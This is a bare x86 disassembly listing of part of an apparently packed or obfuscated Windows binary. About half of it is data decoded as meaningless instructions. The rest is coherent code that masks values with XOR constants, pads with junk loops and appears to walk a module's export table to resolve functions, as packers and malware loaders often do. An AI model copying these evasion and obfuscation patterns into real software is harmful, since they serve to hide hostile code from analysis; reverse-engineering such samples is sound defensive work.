  408101:	add    DWORD PTR [ebp+0x6ebbbdb],eax
  408107:	stos   BYTE PTR es:[edi],al
  408108:	and    dh,BYTE PTR [eax-0x3009608f]
  40810e:	mov    DWORD PTR [ecx-0x69],ebp
  408111:	test   BYTE PTR [esi],dl
  408113:	or     al,dl
  408115:	dec    esp
  408116:	rcr    BYTE PTR cs:[edx],0x2b
  40811a:	push   esp
  40811b:	add    ecx,DWORD PTR [esi-0x6e]
  40811e:	push   ebx
  40811f:	sbb    eax,0xa4a0e8a9
  408124:	neg    BYTE PTR [bx+si+0x46]
  408128:	mov    ecx,edx
  40812a:	out    0xc4,eax
  40812c:	xor    BYTE PTR gs:[ebx-0x58],cl
  408130:	shr    dh,cl
  408132:	and    eax,0xee08b044
  408137:	pop    ebp
  408138:	loop   0x408187
  40813a:	inc    esi
  40813b:	cmp    ebx,DWORD PTR [edx+0x7e]
  40813e:	push   edx
  40813f:	into   
  408140:	lds    eax,FWORD PTR [ecx-0x6c]
  408143:	rcr    DWORD PTR [edx],1
  408145:	push   0xa4bcc406
  40814a:	fisub  WORD PTR [esi-0x41c6a983]
  408150:	aam    0xa6
  408152:	mov    ah,0x7c
  408154:	inc    ebx
  408155:	sbb    al,0x3c
  408157:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408158:	and    al,0xf0
  40815a:	pusha  
  40815b:	aad    0xd0
  40815d:	outs   dx,DWORD PTR ds:[esi]
  40815e:	sbb    eax,DWORD PTR [esi-0x625128e8]
  408164:	out    0xdb,eax
  408166:	pushf  
  408167:	fild   WORD PTR [esi]
  408169:	mov    al,ds:0x4ddbab7d
  40816e:	cmp    esp,DWORD PTR [esi+ebx*1+0x7a]
  408172:	mov    ebx,0xd675900e
  408177:	sbb    edi,esp
  408179:	mov    bl,0x57
  40817b:	shl    DWORD PTR [edi],0xf
  40817e:	add    dl,dl
  408180:	pop    ecx
  408181:	adc    eax,0xded274bc
  408186:	in     al,0xc7
  408188:	push   0xffffffc8
  40818a:	pop    edi
  40818b:	jne    0x40816e
  40818d:	or     esp,DWORD PTR [ebp+0x1ab37699]
  408193:	ror    BYTE PTR [eax-0x13],1
  408196:	mov    ds:0x99f77f5d,eax
  40819b:	aam    0x7a
  40819d:	stos   BYTE PTR es:[edi],al
  40819e:	dec    edx
  40819f:	pushf  
  4081a0:	cmova  esi,DWORD PTR [ecx-0x25a6f3e8]
  4081a7:	test   bl,cl
  4081a9:	pop    ss
  4081aa:	out    dx,al
  4081ab:	push   esp
  4081ac:	jnp    0x4081bc
  4081ae:	jne    0x4081d7
  4081b0:	stc    
  4081b1:	daa    
  4081b2:	or     al,0x32
  4081b4:	cmp    BYTE PTR [esp+ebp*2+0x6fbc5f14],ah
  4081bb:	lea    eax,[edi]
  4081bd:	xor    eax,esp
  4081bf:	test   al,0x64
  4081c1:	sbb    BYTE PTR [edi],bh
  4081c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081c4:	jecxz  0x4081c7
  4081c6:	pop    edi
  4081c7:	bound  ecx,QWORD PTR [eax-0x46]
  4081ca:	fwait
  4081cb:	xchg   BYTE PTR [esi],ah
  4081cd:	and    BYTE PTR [edx+0x5b840253],dl
  4081d3:	ror    BYTE PTR [ebx-0x26],1
  4081d6:	iret   
  4081d7:	lock dec edx
  4081d9:	jp     0x408254
  4081db:	les    ecx,FWORD PTR [ebp-0x41cdf6ca]
  4081e1:	jno    0x40817a
  4081e3:	jb     0x4081de
  4081e5:	nop
  4081e6:	xchg   ebx,eax
  4081e7:	add    BYTE PTR [esi+0x7c],dl
  4081ea:	jo     0x4081fc
  4081ec:	push   cs
  4081ed:	les    eax,FWORD PTR [esp+eiz*4]
  4081f0:	push   ds
  4081f1:	add    ch,BYTE PTR [eax+0x51]
  4081f4:	stos   DWORD PTR es:[edi],eax
  4081f5:	pop    eax
  4081f6:	out    dx,al
  4081f7:	sbb    BYTE PTR [ebp-0x79f2c7fc],ch
  4081fd:	mov    bh,0x2c
  4081ff:	sub    eax,0x5a2ee44b
  408204:	mov    ch,0xeb
  408206:	stos   BYTE PTR es:[edi],al
  408207:	or     eax,0xb0b46f6b
  40820c:	iret   
  40820d:	std    
  40820e:	push   ebx
  40820f:	inc    ecx
  408210:	mov    ?,WORD PTR [ebp-0x33]
  408213:	mov    esp,0xbc70a1ce
  408218:	jmp    0x21ef6aed
  40821d:	pop    ebx
  40821e:	(bad)  
  40821f:	popa   
  408220:	inc    esi
  408221:	jbe    0x40825b
  408223:	or     DWORD PTR [edx-0x13],eax
  408226:	add    eax,0x3b896f4e
  40822b:	iret   
  40822c:	imul   esp,ecx,0x79
  40822f:	lods   al,BYTE PTR ds:[esi]
  408230:	sub    al,0x9d
  408232:	jns    0x408236
  408234:	(bad)  
  408235:	pop    esi
  408236:	add    DWORD PTR [eax-0x56],edx
  408239:	in     eax,dx
  40823a:	mov    esi,eax
  40823c:	mov    cl,0xde
  40823e:	jbe    0x4081ce
  408240:	aaa    
  408241:	jbe    0x408215
  408243:	cmp    DWORD PTR [edx-0x71],ebp
  408246:	mov    edx,0x7b727233
  40824b:	mov    al,ds:0x811ea90e
  408250:	adc    ch,bh
  408252:	xchg   edx,eax
  408253:	hlt    
  408254:	aaa    
  408255:	xchg   ebp,eax
  408256:	aaa    
  408257:	jp     0x40823b
  408259:	add    BYTE PTR [ebp-0x2a86f094],dl
  40825f:	jbe    0x408263
  408261:	data16 sub ah,BYTE PTR [edx-0x63064c36]
  408268:	outs   dx,BYTE PTR ds:[esi]
  408269:	(bad)  
  40826b:	pop    ebx
  40826c:	adc    eax,0xdeb871ab
  408271:	mov    ss,WORD PTR fs:[edi+esi*1]
  408275:	cwde   
  408276:	dec    ecx
  408277:	sbb    al,BYTE PTR [eax+0x2b]
  40827a:	inc    ebp
  40827b:	or     DWORD PTR [edx-0x21],0x3f4b789e
  408282:	retf   0xdb19
  408285:	jb     0x4082ed
  408287:	push   es
  408288:	cmp    edi,DWORD PTR [edi]
  40828a:	call   0xa1682e5
  40828f:	je     0x408276
  408291:	pusha  
  408292:	in     eax,0xf3
  408294:	cdq    
  408295:	outs   dx,BYTE PTR ds:[esi]
  408296:	add    ch,dh
  408298:	mov    edi,0xb5779dae
  40829d:	mov    al,0xa7
  40829f:	jmp    0x4e9637ad
  4082a4:	lahf   
  4082a5:	mov    al,ds:0x3ad3537e
  4082aa:	xor    esi,DWORD PTR [esi-0x15]
  4082ad:	jmp    0xf0883724
  4082b2:	cmp    ebx,DWORD PTR [edx-0x6be467e5]
  4082b8:	or     dh,al
  4082ba:	jl     0x408249
  4082bc:	fmul   DWORD PTR [edx-0x7c]
  4082bf:	sub    eax,0x97694e96
  4082c4:	and    DWORD PTR [esi],ebp
  4082c6:	shl    BYTE PTR [eax],cl
  4082c8:	ins    BYTE PTR es:[edi],dx
  4082c9:	les    esi,FWORD PTR [ebp+0x14]
  4082cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082cd:	fadd   QWORD PTR [edi-0x151fa91c]
  4082d3:	fcmovu st,st(5)
  4082d5:	retf   0xe717
  4082d8:	adc    al,0x42
  4082da:	sub    ebp,ebx
  4082dc:	pop    ebx
  4082dd:	fcom   QWORD PTR [edi+0x5b48bd0d]
  4082e3:	call   0x329e:0x8149bc46
  4082ea:	push   esp
  4082eb:	daa    
  4082ec:	mov    dh,0xc6
  4082ee:	int3   
  4082ef:	ret    0x5963
  4082f2:	pop    eax
  4082f3:	call   0xe908:0xed9f017e
  4082fa:	mov    eax,ds:0x8dad9865
  4082ff:	mov    ds:0x780d8423,al
  408304:	sbb    BYTE PTR [ebx],0xb3
  408307:	idiv   DWORD PTR [esi-0x80]
  40830a:	jmp    0x4082e6
  40830c:	and    eax,0x4ed6c32
  408311:	sbb    ax,cx
  408314:	jae    0x4082e9
  408316:	push   ecx
  408317:	adc    al,0x58
  408319:	cmc    
  40831a:	retf   
  40831b:	cli    
  40831c:	mov    WORD PTR [edi],cs
  40831e:	lods   eax,DWORD PTR ds:[esi]
  40831f:	sti    
  408320:	int    0xa9
  408322:	data16 outs dx,BYTE PTR ds:[esi]
  408324:	popf   
  408325:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408326:	mov    eax,ds:0xf097ec28
  40832b:	dec    esi
  40832c:	jns    0x40833e
  40832e:	jmp    0x98cc:0x6a2af6f6
  408335:	xor    DWORD PTR [edx-0x4897711d],0x25
  40833c:	sti    
  40833d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40833e:	icebp  
  40833f:	arpl   WORD PTR [esp+edx*4],dx
  408342:	mov    ebp,DWORD PTR [ebx-0x16]
  408345:	js     0x4083c1
  408347:	jno    0x4082e5
  408349:	cmp    eax,0x7f2d0081
  40834e:	int    0x11
  408350:	test   al,0x79
  408352:	pop    edx
  408353:	mov    eax,ds:0x49673839
  408358:	sbb    eax,0x241ec5c5
  40835d:	out    0x14,eax
  40835f:	sbb    eax,0x9aa4d530
  408364:	jbe    0x408388
  408366:	out    0x85,al
  408368:	xor    ebp,DWORD PTR [ebp+ecx*8+0x69]
  40836c:	rcr    DWORD PTR [edi+0x33913012],1
  408372:	popf   
  408373:	jp     0x408361
  408375:	imul   ecx,esp,0xfffffffc
  408378:	fbstp  TBYTE PTR [edx-0x10]
  40837b:	scas   eax,DWORD PTR es:[edi]
  40837c:	add    esi,esi
  40837e:	sbb    DWORD PTR [eax-0x205b2be1],esp
  408384:	(bad)  
  408385:	mov    ds:0xa226bc8a,al
  40838a:	icebp  
  40838b:	add    eax,0x7453e4ff
  408390:	xor    cl,ch
  408392:	cmp    BYTE PTR [ebp-0x13],0x6d
  408396:	pushf  
  408397:	add    esp,DWORD PTR [ecx+0x1c]
  40839a:	push   cs
  40839b:	arpl   WORD PTR [ebx-0x34153bc8],bp
  4083a1:	out    0xb4,eax
  4083a3:	xchg   edx,eax
  4083a4:	popa   
  4083a5:	js     0x408400
  4083a7:	mov    bl,al
  4083a9:	jge    0x4083fe
  4083ab:	rcl    BYTE PTR [edx],0xe8
  4083ae:	mov    esi,0x67b5a676
  4083b3:	mov    edx,DWORD PTR [ecx]
  4083b5:	addr16 dec ebp
  4083b7:	inc    edi
  4083b8:	das    
  4083b9:	repz xchg edx,eax
  4083bb:	sar    DWORD PTR [eax+0x6f],0xd4
  4083bf:	xlat   BYTE PTR ds:[ebx]
  4083c0:	lahf   
  4083c1:	in     al,0xf5
  4083c3:	pushf  
  4083c4:	sbb    al,ch
  4083c6:	push   0xffffff86
  4083c8:	mov    DWORD PTR [esi-0x20],edx
  4083cb:	adc    eax,0x9bbbc042
  4083d0:	out    dx,eax
  4083d1:	(bad)  
  4083d2:	xchg   ecx,eax
  4083d3:	add    edi,DWORD PTR [eax-0x74]
  4083d6:	and    bl,dl
  4083d8:	ret    0x39a1
  4083db:	mov    eax,ebp
  4083dd:	sahf   
  4083de:	test   DWORD PTR [esi-0x1a],edx
  4083e1:	mov    ch,0xb6
  4083e3:	out    0x7e,eax
  4083e5:	fadd   st,st(7)
  4083e7:	inc    ebp
  4083e8:	mov    ebx,0x4b4ed31e
  4083ed:	dec    esi
  4083ee:	xchg   cl,bl
  4083f0:	stc    
  4083f1:	jle    0x408470
  4083f3:	add    al,0x1
  4083f5:	lods   al,BYTE PTR ds:[esi]
  4083f6:	gs and eax,0x948c96d6
  4083fc:	fdiv   st(2),st
  4083fe:	test   BYTE PTR [esi],dl
  408400:	lea    ebp,[ebx+0x4ea1484a]
  408406:	stc    
  408407:	jge    0x40847a
  408409:	in     al,0x7
  40840b:	aas    
  40840c:	in     eax,dx
  40840d:	sub    BYTE PTR [ebx],ch
  40840f:	xor    cl,BYTE PTR [esi+0x5d45e77f]
  408415:	sbb    DWORD PTR [esi-0x44ebedbe],ebp
  40841b:	test   BYTE PTR gs:[edi+0x42],ch
  40841f:	mov    ebx,0x37eeef06
  408424:	inc    esi
  408425:	test   BYTE PTR [edi+ebp*8+0x72],0x63
  40842a:	xchg   ebp,eax
  40842b:	test   BYTE PTR [edx-0x271c635],cl
  408431:	sar    BYTE PTR [edi+esi*1+0x3f],0x73
  408436:	or     BYTE PTR [edx+0x63e996f],ah
  40843c:	mov    ah,0x52
  40843e:	lods   eax,DWORD PTR ds:[esi]
  40843f:	mov    DWORD PTR [ebx+0xf],0x94b13688
  408446:	fisttp WORD PTR [edx]
  408448:	fisttp DWORD PTR [esi+esi*8+0x57]
  40844c:	into   
  40844d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40844e:	mov    ecx,0xcc822ad9
  408453:	hlt    
  408454:	pop    eax
  408455:	or     al,0xd1
  408457:	dec    edi
  408458:	pop    eax
  408459:	lock fild DWORD PTR [edi*1-0x5836931e]
  408461:	and    al,0x6a
  408463:	or     eax,0xffffffc2
  408466:	out    0xf8,eax
  408468:	xor    cl,BYTE PTR [edx+0x45881004]
  40846e:	dec    DWORD PTR [ebx+0x558bd045]
  408474:	hlt    
  408475:	xor    eax,esi
  408477:	add    eax,edi
  408479:	imul   eax,edx
  40847c:	mov    edx,DWORD PTR [ebp-0x28]
  40847f:	xor    edx,esi
  408481:	add    eax,edx
  408483:	mov    edx,DWORD PTR [ebp-0x8]
  408486:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  40848e:	mov    edx,DWORD PTR [ebp-0x50]
  408491:	xor    edx,esi
  408493:	lea    eax,[edx+eax*1+0x3272fa]
  40849a:	movzx  edx,BYTE PTR [ebp-0x1]
  40849e:	xor    edx,eax
  4084a0:	mov    BYTE PTR [ebp-0x1],dl
  4084a3:	mov    al,BYTE PTR [ebp-0x1]
  4084a6:	mov    edx,DWORD PTR [ebp-0x30]
  4084a9:	mov    ebx,DWORD PTR [ebp-0xc]
  4084ac:	xor    edx,esi
  4084ae:	add    edx,edi
  4084b0:	imul   edx,ebx
  4084b3:	mov    ebx,DWORD PTR [ebp-0x8]
  4084b6:	mov    BYTE PTR [edx+ebx*1],al
  4084b9:	mov    eax,DWORD PTR [ebp-0x40]
  4084bc:	mov    edx,DWORD PTR [ebp-0x28]
  4084bf:	xor    eax,esi
  4084c1:	xor    edx,esi
  4084c3:	add    eax,edi
  4084c5:	add    edx,edi
  4084c7:	imul   eax,edx
  4084ca:	add    eax,DWORD PTR [ebp-0xc]
  4084cd:	mov    DWORD PTR [ebp-0xc],eax
  4084d0:	mov    eax,DWORD PTR [ebp-0xc]
  4084d3:	mov    edx,DWORD PTR [ebp-0x18]
  4084d6:	cmp    edx,eax
  4084d8:	jb     0x406053
  4084de:	mov    eax,DWORD PTR [ebp-0x28]
  4084e1:	mov    edx,DWORD PTR [ebp-0x18]
  4084e4:	xor    eax,esi
  4084e6:	add    eax,edi
  4084e8:	imul   eax,edx
  4084eb:	mov    edx,DWORD PTR [ebp-0x1c]
  4084ee:	xor    edx,esi
  4084f0:	add    edx,edi
  4084f2:	or     eax,edx
  4084f4:	mov    edx,DWORD PTR [ebp-0x20]
  4084f7:	xor    edx,esi
  4084f9:	add    eax,edx
  4084fb:	mov    edx,DWORD PTR [ebp-0x20]
  4084fe:	xor    edx,esi
  408500:	add    eax,edx
  408502:	mov    edx,DWORD PTR [ebp-0x10]
  408505:	lea    eax,[eax+edx*1+0x64e5f4]
  40850c:	jmp    0x408520
  408511:	mov    eax,DWORD PTR [ebp-0x20]
  408514:	mov    edx,DWORD PTR [ebp-0x10]
  408517:	xor    eax,esi
  408519:	lea    eax,[eax+edx*1+0x3272fa]
  408520:	mov    DWORD PTR [ebp-0x10],eax
  408523:	jmp    0x405fa0
  408528:	mov    ebx,DWORD PTR [ebp-0x3c]
  40852b:	mov    eax,DWORD PTR [ebp+0xc]
  40852e:	xor    eax,esi
  408530:	lea    ecx,[ecx+eax*1+0x3272fa]
  408537:	lea    eax,[ecx-0x3272fa]
  40853d:	xor    eax,esi
  40853f:	cmp    eax,0xf89c95b5
  408544:	jne    0x403bac
  40854a:	dec    DWORD PTR [ebp-0x34]
  40854d:	jne    0x403ba0
  408553:	mov    eax,DWORD PTR [ebp+0x8]
  408556:	mov    ecx,DWORD PTR [ebp+0xc]
  408559:	mov    edx,DWORD PTR [ebp+0x8]
  40855c:	xor    ecx,esi
  40855e:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272fa]
  408565:	xor    eax,esi
  408567:	mov    al,BYTE PTR [eax+ebx*1+0x3272fa]
  40856e:	xor    edx,esi
  408570:	mov    BYTE PTR [edx+ebx*1+0x3272fa],cl
  408577:	mov    ecx,DWORD PTR [ebp+0xc]
  40857a:	xor    ecx,esi
  40857c:	mov    BYTE PTR [ecx+ebx*1+0x3272fa],al
  408583:	mov    eax,DWORD PTR [ebp+0xc]
  408586:	xor    eax,esi
  408588:	add    eax,edi
  40858a:	pop    edi
  40858b:	pop    esi
  40858c:	pop    ebx
  40858d:	leave  
  40858e:	ret    0x8
  408591:	xor    eax,eax
  408593:	ret    
  408594:	push   ebp
  408595:	mov    ebp,esp
  408597:	sub    esp,0x38
  40859a:	and    DWORD PTR ds:0x426ebd,0x0
  4085a4:	mov    eax,ds:0x426ebd
  4085a9:	inc    eax
  4085aa:	mov    ds:0x426ebd,eax
  4085af:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4085b6:	jg     0x4085e2
  4085bc:	jmp    0x4085d5
  4085c1:	push   DWORD PTR [ebp-0x10]
  4085c4:	push   0x2f91
  4085c9:	push   DWORD PTR [ebp-0x20]
  4085cc:	push   DWORD PTR [ebp-0x1c]
  4085cf:	call   DWORD PTR ds:0x430a1c
  4085d5:	cmp    DWORD PTR ds:0x426ebd,0x1c
  4085dc:	jb     0x4085a4
  4085e2:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4085e9:	sbb    DWORD PTR ds:0x426f19,ecx
  4085ef:	push   ebx
  4085f0:	add    DWORD PTR ds:0x426f15,edx
  4085f6:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4085fd:	xor    DWORD PTR ds:0x426e91,0x301b
  408607:	mov    eax,DWORD PTR [ebp-0x4]
  40860a:	xor    DWORD PTR ds:0x426f2d,0x2f12
  408614:	push   esi
  408615:	sbb    DWORD PTR ds:0x426ed9,edi
  40861b:	mov    esi,0x75108b3
  408620:	or     DWORD PTR ds:0x426eb9,0x50e3
  40862a:	xor    eax,esi
  40862c:	adc    DWORD PTR ds:0x426ecd,0x426e99
  408636:	push   edi
  408637:	mov    edi,0x3272fa
  40863c:	or     DWORD PTR ds:0x426ea1,0x426e81
  408646:	add    eax,edi
  408648:	and    DWORD PTR ds:0x426f29,0x7053
  408652:	mov    DWORD PTR [ebp-0x1c],eax
  408655:	mov    eax,DWORD PTR [ebp+0x14]
  408658:	test   eax,eax
  40865a:	mov    DWORD PTR ds:0x426f09,0x1147
  408664:	je     0x408688
  40866a:	mov    eax,ds:0x426ec5
  40866f:	and    eax,DWORD PTR ds:0x426e89
  408675:	mov    ds:0x426ec5,eax
  40867a:	mov    eax,DWORD PTR [ebp+0x14]
  40867d:	adc    ebx,0x54d7
  408683:	mov    eax,DWORD PTR [eax]
  408685:	mov    DWORD PTR [ebp-0x1c],eax
  408688:	mov    eax,DWORD PTR [ebp-0x4]
  40868b:	and    DWORD PTR ds:0x426ea1,0x0
  408695:	mov    ebx,DWORD PTR ds:0x426ea1
  40869b:	inc    ebx
  40869c:	mov    DWORD PTR ds:0x426ea1,ebx
  4086a2:	cmp    DWORD PTR ds:0x426ea1,0x9
  4086a9:	ja     0x4086e9
  4086af:	jmp    0x4086c2
  4086b4:	push   0x426e8d
  4086b9:	push   DWORD PTR [ebp-0x14]
  4086bc:	call   DWORD PTR ds:0x430a48
  4086c2:	cmp    DWORD PTR ds:0x426ea1,0x8
  4086c9:	jne    0x4086dc
  4086cf:	mov    ebx,DWORD PTR ds:0x426ea1
  4086d5:	inc    ebx
  4086d6:	mov    DWORD PTR ds:0x426ea1,ebx
  4086dc:	cmp    DWORD PTR ds:0x426ea1,0x1e
  4086e3:	jb     0x408695
  4086e9:	xor    eax,esi
  4086eb:	sbb    ebx,DWORD PTR ds:0x426e85
  4086f1:	add    eax,edi
  4086f3:	mov    DWORD PTR [ebp-0x8],eax
  4086f6:	mov    eax,ds:0x426e85
  4086fb:	sub    DWORD PTR ds:0x426ed9,eax
  408701:	mov    eax,DWORD PTR [ebp-0xc]
  408704:	xor    eax,esi
  408706:	and    DWORD PTR ds:0x426edd,ecx
  40870c:	add    eax,edi
  40870e:	mov    DWORD PTR [ebp-0x24],eax
  408711:	mov    eax,DWORD PTR [ebp-0x4]
  408714:	xor    eax,esi
  408716:	and    DWORD PTR ds:0x426eb1,0x0
  408720:	jmp    0x408734
  408725:	xor    ebx,ebx
  408727:	or     ebx,DWORD PTR ds:0x426eb1
  40872d:	inc    ebx
  40872e:	mov    DWORD PTR ds:0x426eb1,ebx
  408734:	cmp    DWORD PTR ds:0x426eb1,0x15
  40873b:	jae    0x40878a
  408741:	cmp    DWORD PTR ds:0x426eb1,0x4
  408748:	ja     0x40878a
  40874e:	jmp    0x40876b
  408753:	push   0x3639
  408758:	push   0x1bb0
  40875d:	push   DWORD PTR [ebp-0x10]
  408760:	push   0x5fa6
  408765:	call   DWORD PTR ds:0x430a4c
  40876b:	cmp    DWORD PTR ds:0x426eb1,0x3
  408772:	jne    0x408785
  408778:	mov    ebx,DWORD PTR ds:0x426eb1
  40877e:	inc    ebx
  40877f:	mov    DWORD PTR ds:0x426eb1,ebx
  408785:	jmp    0x408725
  40878a:	add    eax,edi
  40878c:	movzx  ebx,BYTE PTR ds:0x426f15
  408793:	sub    DWORD PTR ds:0x426ea1,ebx
  408799:	mov    DWORD PTR [ebp-0x30],eax
  40879c:	sub    eax,eax
  40879e:	mov    ebx,DWORD PTR [ebp-0x4]
  4087a1:	not    eax
  4087a3:	xor    ebx,esi
  4087a5:	add    ebx,edi
  4087a7:	sbb    eax,0xd90
  4087ac:	mov    eax,DWORD PTR [ebp-0x24]
  4087af:	dec    DWORD PTR ds:0x426ea9
  4087b5:	sub    eax,edi
  4087b7:	lea    ecx,[ebx-0x3272fa]
  4087bd:	sbb    DWORD PTR ds:0x426f29,0x78a2
  4087c7:	xor    eax,esi
  4087c9:	add    DWORD PTR ds:0x426ec9,0x4dad
  4087d3:	xor    ecx,esi
  4087d5:	cmp    ecx,eax
  4087d7:	mov    DWORD PTR ds:0x426ef5,0x6961
  4087e1:	je     0x408aae
  4087e7:	add    DWORD PTR ds:0x426f01,0x426f15
  4087f1:	mov    eax,DWORD PTR [ebp-0x4]
  4087f4:	sub    DWORD PTR ds:0x426e81,0x820
  4087fe:	xor    eax,esi
  408800:	add    eax,edi
  408802:	mov    DWORD PTR ds:0x426eb1,0x301a
  40880c:	cmp    ebx,eax
  40880e:	mov    DWORD PTR ds:0x426ee5,0x6594
  408818:	jne    0x408a65
  40881e:	push   DWORD PTR [ebp+0x8]
  408821:	sub    DWORD PTR ds:0x426ee9,0x426f19
  40882b:	call   0x41d4a8
  408830:	mov    DWORD PTR [ebp-0x14],eax
  408833:	sub    DWORD PTR ds:0x426f15,edx
  408839:	mov    eax,DWORD PTR [ebp-0x4]
  40883c:	and    ecx,0x4a39
  408842:	mov    ecx,DWORD PTR [ebp-0x14]
  408845:	xor    eax,esi
  408847:	sub    DWORD PTR ds:0x426eb5,0x426f0d
  408851:	add    eax,edi
  408853:	cmp    ecx,eax
  408855:	je     0x40aece
  40885b:	adc    DWORD PTR ds:0x426f25,0x56c1
  408865:	push   DWORD PTR [ebp-0x14]
  408868:	and    DWORD PTR ds:0x426f29,0x426f11
  408872:	push   DWORD PTR [ebp+0x8]
  408875:	and    DWORD PTR ds:0x426ed1,0x426ef9
  40887f:	call   0x41f8dc
  408884:	and    ecx,0xfc3
  40888a:	mov    DWORD PTR [ebp-0x14],eax
  40888d:	mov    DWORD PTR ds:0x426f09,0x15
  408897:	cmp    DWORD PTR ds:0x426f09,0x0
  40889e:	je     0x4088e4
  4088a4:	cmp    DWORD PTR ds:0x426f09,0x9
  4088ab:	ja     0x4088e4
  4088b1:	jmp    0x4088bc
  4088b6:	call   DWORD PTR ds:0x430a20
  4088bc:	cmp    DWORD PTR ds:0x426f09,0xa
  4088c3:	jne    0x4088d4
  4088c9:	mov    eax,ds:0x426f09
  4088ce:	dec    eax
  4088cf:	mov    ds:0x426f09,eax
  4088d4:	mov    eax,ds:0x426f09
  4088d9:	dec    eax
  4088da:	mov    ds:0x426f09,eax
  4088df:	jmp    0x408897
  4088e4:	mov    eax,DWORD PTR [ebp-0x4]
  4088e7:	mov    ecx,DWORD PTR [ebp-0x14]
  4088ea:	add    DWORD PTR ds:0x426f01,0x32f5
  4088f4:	xor    eax,esi
  4088f6:	sub    DWORD PTR ds:0x426f11,0x426ec1
  408900:	add    eax,edi
  408902:	mov    DWORD PTR ds:0x426e81,0x73a8
  40890c:	cmp    ecx,eax
  40890e:	mov    DWORD PTR ds:0x426e81,0x4555
  408918:	je     0x40aece
  40891e:	mov    eax,DWORD PTR [ebp-0x14]
  408921:	mov    eax,DWORD PTR [eax+0x18]
  408924:	xor    DWORD PTR ds:0x426edd,0x1983
  40892e:	mov    DWORD PTR [ebp-0x24],eax
  408931:	adc    eax,ecx
  408933:	mov    eax,DWORD PTR [ebp-0x14]
  408936:	and    DWORD PTR ds:0x426f2d,0x0
  408940:	jmp    0x408952
  408945:	mov    ecx,DWORD PTR ds:0x426f2d
  40894b:	inc    ecx
  40894c:	mov    DWORD PTR ds:0x426f2d,ecx
  408952:	cmp    DWORD PTR ds:0x426f2d,0x12
  408959:	jae    0x4089a4
  40895f:	cmp    DWORD PTR ds:0x426f2d,0x5
  408966:	jbe    0x4089a4
  40896c:	jmp    0x408985
  408971:	push   0x426099
  408976:	push   DWORD PTR [ebp-0x28]
  408979:	push   DWORD PTR [ebp-0x1c]
  40897c:	push   DWORD PTR [ebp-0x10]
  40897f:	call   DWORD PTR ds:0x430a24
  408985:	cmp    DWORD PTR ds:0x426f2d,0x4
  40898c:	jne    0x40899f
  408992:	mov    ecx,DWORD PTR ds:0x426f2d
  408998:	inc    ecx
  408999:	mov    DWORD PTR ds:0x426f2d,ecx
  40899f:	jmp    0x408945
  4089a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4089a7:	add    ecx,DWORD PTR [eax+0x20]
  4089aa:	and    DWORD PTR ds:0x426efd,0x4f65
  4089b4:	mov    DWORD PTR [ebp-0x2c],ecx
  4089b7:	mov    eax,DWORD PTR [ebp-0x14]
  4089ba:	dec    DWORD PTR ds:0x426ed9
  4089c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4089c3:	and    DWORD PTR ds:0x426ef1,0x27b6
  4089cd:	add    ecx,DWORD PTR [eax+0x24]
  4089d0:	and    DWORD PTR ds:0x426f11,0x472e
  4089da:	mov    DWORD PTR [ebp-0x34],ecx
  4089dd:	mov    DWORD PTR ds:0x426f05,0x15
  4089e7:	cmp    DWORD PTR ds:0x426f05,0x0
  4089ee:	je     0x408a3a
  4089f4:	cmp    DWORD PTR ds:0x426f05,0x6
  4089fb:	jle    0x408a3a
  408a01:	jmp    0x408a0f
  408a06:	push   DWORD PTR [ebp-0x28]
  408a09:	call   DWORD PTR ds:0x430a28
  408a0f:	cmp    DWORD PTR ds:0x426f05,0x7
  408a16:	jne    0x408a2a
  408a1c:	xor    eax,eax
  408a1e:	xor    eax,DWORD PTR ds:0x426f05
  408a24:	dec    eax
  408a25:	mov    ds:0x426f05,eax
  408a2a:	mov    eax,ds:0x426f05
  408a2f:	dec    eax
  408a30:	mov    ds:0x426f05,eax
  408a35:	jmp    0x4089e7
  408a3a:	mov    eax,DWORD PTR [ebp-0x14]
  408a3d:	or     ecx,0x6017
  408a43:	mov    ecx,DWORD PTR [ebp+0x8]
  408a46:	sbb    DWORD PTR ds:0x426e9d,0x426f29
  408a50:	add    ecx,DWORD PTR [eax+0x1c]
  408a53:	mov    DWORD PTR ds:0x426e89,0x71b1
  408a5d:	mov    DWORD PTR [ebp-0x14],ecx
  408a60:	jmp    0x408ae1
  408a65:	mov    ecx,DWORD PTR ds:0x426ee1
  408a6b:	or     DWORD PTR ds:0x426f29,ecx
  408a71:	mov    eax,DWORD PTR [ebp-0x2c]
  408a74:	mov    ecx,DWORD PTR [ebp+0x8]
  408a77:	add    ecx,DWORD PTR [eax+ebx*4]
  408a7a:	add    eax,DWORD PTR ds:0x426f11
  408a80:	mov    DWORD PTR [ebp-0x28],ecx
  408a83:	mov    eax,DWORD PTR [ebp-0x4]
  408a86:	mov    ecx,DWORD PTR [ebp-0x28]
  408a89:	xor    eax,esi
  408a8b:	add    eax,edi
  408a8d:	mov    DWORD PTR ds:0x426eb5,0x5328
  408a97:	cmp    ecx,eax
  408a99:	je     0x408ae1
  408a9f:	mov    DWORD PTR ds:0x426f0d,0x30c
  408aa9:	jmp    0x408ad2
  408aae:	mov    eax,DWORD PTR [ebp-0x4]
  408ab1:	mov    ecx,DWORD PTR [ebp-0x8]
  408ab4:	xor    eax,esi
  408ab6:	add    eax,edi
  408ab8:	cmp    ecx,eax
  408aba:	mov    eax,DWORD PTR [ebp-0x4]
  408abd:	je     0x40aed1
  408ac3:	mov    ecx,DWORD PTR [ebp-0x30]
  408ac6:	xor    eax,esi
  408ac8:	add    eax,edi
  408aca:	cmp    ecx,eax
  408acc:	je     0x40aeda
  408ad2:	lea    eax,[ebp-0x8]
  408ad5:	push   eax
  408ad6:	push   DWORD PTR [ebp-0x28]
  408ad9:	push   DWORD PTR [ebp+0xc]
  408adc:	call   0x411c13
  408ae1:	mov    eax,DWORD PTR [ebp-0x4]
  408ae4:	mov    ecx,DWORD PTR [ebp-0x8]
  408ae7:	xor    eax,esi
  408ae9:	add    eax,edi
  408aeb:	cmp    ecx,eax
